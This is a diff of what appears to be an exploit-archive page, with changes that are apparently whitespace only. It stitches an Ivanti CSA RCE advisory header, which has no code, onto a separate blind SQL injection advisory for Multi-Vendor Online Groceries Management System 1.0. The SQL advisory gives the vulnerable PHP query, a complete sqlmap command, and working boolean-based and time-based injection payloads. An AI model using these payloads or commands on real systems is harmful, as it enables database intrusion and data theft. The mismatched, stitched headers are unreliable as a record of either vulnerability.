@@ -50,45 +50,45 @@ Multi-Vendor Online Groceries Management System 1.0
 -----
 
 ```
-# Exploit Title: Ivanti Endpoint Manager 4.6 - Remote Code Execution (RCE)  
-# Date: 20/03/2022   
-# Exploit Author: d7x   
-# Vendor Homepage: https://www.ivanti.com/   
-# Software Link: https://forums.ivanti.com/s/article/Customer-Update-Cloud-Service-Appliance-4-6   
-# Version: CSA 4.6 4.5 - EOF Aug 2021   
-# Tested on: Linux x86_64  
-# CVE : CVE-2021-44529  
+# Exploit Title: Ivanti Endpoint Manager 4.6 - Remote Code Execution (RCE)  
+# Date: 20/03/2022   
+# Exploit Author: d7x   
+# Vendor Homepage: https://www.ivanti.com/   
+# Software Link: https://forums.ivanti.com/s/article/Customer-Update-Cloud-Service-Appliance-4-6   
+# Version: CSA 4.6 4.5 - EOF Aug 2021   
+# Tested on: Linux x86_64  
+# CVE : CVE-2021-44529  
   
 ###  
-# Exploit Title: Multi-Vendor Online Groceries Management System 1.0 - 'id' Blind SQL Injection  
-# Date: 11/02/2022  
-# Exploit Author: Saud Alenazi  
-# Vendor Homepage: https://www.sourcecodester.com/  
-# Software Link: https://www.sourcecodester.com/php/15166/multi-vendor-online-groceries-management-system-phpoop-free-source-code.html  
-# Version: 1.0  
-# Tested on: XAMPP, Windows 10  
+# Exploit Title: Multi-Vendor Online Groceries Management System 1.0 - 'id' Blind SQL Injection  
+# Date: 11/02/2022  
+# Exploit Author: Saud Alenazi  
+# Vendor Homepage: https://www.sourcecodester.com/  
+# Software Link: https://www.sourcecodester.com/php/15166/multi-vendor-online-groceries-management-system-phpoop-free-source-code.html  
+# Version: 1.0  
+# Tested on: XAMPP, Windows 10  
   
   
-# Vulnerable Code  
+# Vulnerable Code  
   
-line 2 in file "mvogms/products/view_product.php  
+line 2 in file "mvogms/products/view_product.php  
   
-$qry = $conn->query("SELECT  p.*, v.shop_name as vendor, c.name as `category` FROM `product_list` p inner join vendor_list v on p.vendor_id = v.id inner join category_list c on p.category_id = c.id where p.delete_flag = 0 and p.id = '{$_GET['id']}'");  
+$qry = $conn->query("SELECT  p.*, v.shop_name as vendor, c.name as `category` FROM `product_list` p inner join vendor_list v on p.vendor_id = v.id inner join category_list c on p.category_id = c.id where p.delete_flag = 0 and p.id = '{$_GET['id']}'");  
   
-# Sqlmap command:  
+# Sqlmap command:  
   
-sqlmap -u 'localhost/mvogms/?page=products/view_product&id=3' -p id --level=5 --risk=3 --dbs --random-agent --eta --batch  
+sqlmap -u 'localhost/mvogms/?page=products/view_product&id=3' -p id --level=5 --risk=3 --dbs --random-agent --eta --batch  
   
-# Output:  
+# Output:  
   
-Parameter: id (GET)  
-    Type: boolean-based blind  
-    Title: AND boolean-based blind - WHERE or HAVING clause  
-    Payload: page=products/view_product&id=3' AND 9973=9973-- ogag  
+Parameter: id (GET)  
+    Type: boolean-based blind  
+    Title: AND boolean-based blind - WHERE or HAVING clause  
+    Payload: page=products/view_product&id=3' AND 9973=9973-- ogag  
   
-    Type: time-based blind  
-    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)  
-    Payload: page=products/view_product&id=3' AND (SELECT 2002 FROM (SELECT(SLEEP(5)))anjK)-- glsQ 
+    Type: time-based blind  
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)  
+    Payload: page=products/view_product&id=3' AND (SELECT 2002 FROM (SELECT(SLEEP(5)))anjK)-- glsQ 
 ```
 
   
